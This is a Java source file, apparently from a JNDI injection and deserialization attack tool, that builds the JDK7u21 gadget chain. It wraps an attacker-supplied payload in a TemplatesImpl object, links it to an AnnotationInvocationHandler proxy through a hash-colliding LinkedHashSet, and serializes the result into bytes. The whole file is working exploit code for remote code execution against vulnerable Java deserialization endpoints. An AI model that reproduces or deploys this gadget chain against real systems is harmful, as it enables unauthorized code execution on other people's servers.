package sonomon.jndi.deser.gadgets;

import com.nqzero.permit.Permit;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.LinkedHashSet;
import javax.xml.transform.Templates;
import sonomon.jndi.deser.Deserialize;
import sonomon.jndi.factory.FactoryUtils;

public class JDK7u21 implements SerializeObject{
	public byte[] getJavaSerializeData(String payload, String jarname) throws Exception {
		byte[] bs = FactoryUtils.objectToBytes(getJavaSerializeObject(payload, jarname));
		return bs;
	}
	public Object getJavaSerializeObject(String payload, String jarname) throws Exception {
		TemplatesImpl tempImpl = Deserialize.getTemplatesImpl(payload);
        HashMap hm = new HashMap();
        Constructor<?> ctor = (Constructor<?>) Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
        Permit.setAccessible(ctor);
        InvocationHandler ih = (InvocationHandler)ctor.newInstance(new Object[] { Override.class, hm });
        Deserialize.setFieldValue(ih, "type", Templates.class);
        Templates TemplatesProxy = (Templates)Proxy.newProxyInstance(Templates.class.getClassLoader(), new Class[] {Templates.class}, ih);
        LinkedHashSet lhs = new LinkedHashSet();
        lhs.add(tempImpl);
        lhs.add(TemplatesProxy);
        Deserialize.setFieldValue(tempImpl, "_auxClasses", null);
        Deserialize.setFieldValue(tempImpl, "_class", null);
        hm.put("0DE2FF10", tempImpl);
        
        return lhs;
    }
}